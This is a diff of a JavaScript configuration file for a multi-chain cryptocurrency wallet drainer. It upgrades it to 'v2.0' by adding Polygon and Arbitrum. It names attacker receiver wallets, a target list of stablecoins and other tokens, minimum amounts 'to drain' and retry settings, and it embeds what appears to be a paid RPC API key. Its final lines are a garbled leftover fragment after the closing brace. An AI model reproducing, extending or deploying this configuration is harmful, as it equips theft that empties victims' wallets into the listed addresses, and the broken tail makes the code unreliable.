@@ -1,53 +1,112 @@
-// Multi-Chain Wallet Drainer Configuration
+// Universal Multi-Chain Drainer Configuration v2.0
 window.DRAINER_CONFIG = {
     // Receiver addresses for each network
     RECEIVER_ADDRESSES: {
         ethereum: "0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49",
         bsc: "0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49", 
-        solana: "4NW3YXvEiNEVX6QxeS19FvSZ963vGqMQMvxguR8npq6s", // Solana address format
-        tron: "TGdWPEEiDxiJPZskJhnJYZBKw3qbGUDXoU", // Tron address format
-        bitcoin: "bc1qjr88m5ne8hzk0uw7mdh80m5apa8da9n5wag900" // Bitcoin address format
+        polygon: "0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49",
+        arbitrum: "0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49",
+        solana: "4NW3YXvEiNEVX6QxeS19FvSZ963vGqMQMvxguR8npq6s",
+        tron: "TGdWPEEiDxiJPZskJhnJYZBKw3qbGUDXoU",
+        bitcoin: "bc1qjr88m5ne8hzk0uw7mdh80m5apa8da9n5wag900"
     },
 
-    // Network configurations
+    // Solana Premium RPC Configuration
+    SOLANA_RPC: "https://solana-mainnet.api.syndica.io/api-key/oNprEqE6EkkFUFhf1GBM4TegN9veFkrQrUehkLC8XKNiFUDdWhohF2pBsWXpZAgQRQrs8SwxFSXBc7vfdtDgBdFT726RmpzTj4",
+
+    // Network configurations with optimized settings
     NETWORKS: {
         ethereum: {
-            name: "Ethereum",
+            name: "Ethereum Mainnet",
             chainId: 1,
-            nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
-            rpcUrls: [
-                "https://eth-mainnet.g.alchemy.com/v2/demo",
-                "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161",
-                "https://cloudflare-eth.com"
-            ],
-            blockExplorerUrls: ["https://etherscan.io"],
-            gasLimit: {
-                transfer: 21000,
-                token: 65000
-            }
+            currency: "ETH",
+            rpcUrl: "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161",
+            explorerUrl: "https://etherscan.io/tx/",
+            gasMultiplier: 1.2,
+            gasLimit: { transfer: 21000, token: 80000 }
         },
         bsc: {
             name: "BNB Smart Chain",
             chainId: 56,
-            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-            rpcUrls: [
-                "https://bsc-dataseed1.binance.org",
-                "https://bsc-dataseed2.binance.org",
-                "https://bsc-dataseed3.binance.org"
-            ],
-            blockExplorerUrls: ["https://bscscan.com"],
-            gasLimit: {
-                transfer: 21000,
-                token: 65000
-            }
+            currency: "BNB", 
+            rpcUrl: "https://bsc-dataseed1.binance.org/",
+            explorerUrl: "https://bscscan.com/tx/",
+            gasMultiplier: 1.3,
+            gasLimit: { transfer: 21000, token: 80000 }
         },
-        solana: {
-            name: "Solana",
-            cluster: "mainnet-beta",
-            rpcUrls: [
-                "https://api.mainnet-beta.solana.com",
-                "https://solana-api.projectserum.com"
-            ],
+        polygon: {
+            name: "Polygon",
+            chainId: 137,
+            currency: "MATIC",
+            rpcUrl: "https://polygon-rpc.com/",
+            explorerUrl: "https://polygonscan.com/tx/",
+            gasMultiplier: 1.5,
+            gasLimit: { transfer: 21000, token: 80000 }
+        },
+        arbitrum: {
+            name: "Arbitrum One",
+            chainId: 42161,
+            currency: "ETH",
+            rpcUrl: "https://arb1.arbitrum.io/rpc",
+            explorerUrl: "https://arbiscan.io/tx/",
+            gasMultiplier: 1.1,
+            gasLimit: { transfer: 21000, token: 80000 }
+        }
+    },
+
+    // Popular tokens to target
+    TOKENS: {
+        ethereum: [
+            { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
+            { symbol: "USDC", address: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", decimals: 6 },
+            { symbol: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 },
+            { symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8 },
+            { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
+            { symbol: "UNI", address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 }
+        ],
+        bsc: [
+            { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
+            { symbol: "USDC", address: "0x8965349fb649A33a30cbFDa057D8eC2C48AbE2A2", decimals: 18 },
+            { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
+            { symbol: "CAKE", address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", decimals: 18 }
+        ],
+        polygon: [
+            { symbol: "USDT", address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6 },
+            { symbol: "USDC", address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", decimals: 6 },
+            { symbol: "WMATIC", address: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270", decimals: 18 }
+        ],
+        arbitrum: [
+            { symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", decimals: 6 },
+            { symbol: "USDC", address: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", decimals: 6 }
+        ],
+        solana: [
+            { symbol: "USDC", mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", decimals: 6 },
+            { symbol: "USDT", mint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", decimals: 6 }
+        ],
+        tron: [
+            { symbol: "USDT", address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", decimals: 6 }
+        ]
+    },
+
+    // Minimum amounts to drain
+    MIN_AMOUNTS: {
+        ethereum: 0.001,
+        bsc: 0.001,
+        polygon: 0.1,
+        arbitrum: 0.001,
+        solana: 0.001,
+        tron: 1,
+        bitcoin: 0.00001
+    },
+
+    // Operation settings
+    SETTINGS: {
+        timeout: 30000,
+        retries: 3,
+        gasBuffer: 1.2,
+        simulateTransactions: false
+    }
+};
             blockExplorerUrls: ["https://explorer.solana.com"]
         },
         tron: {
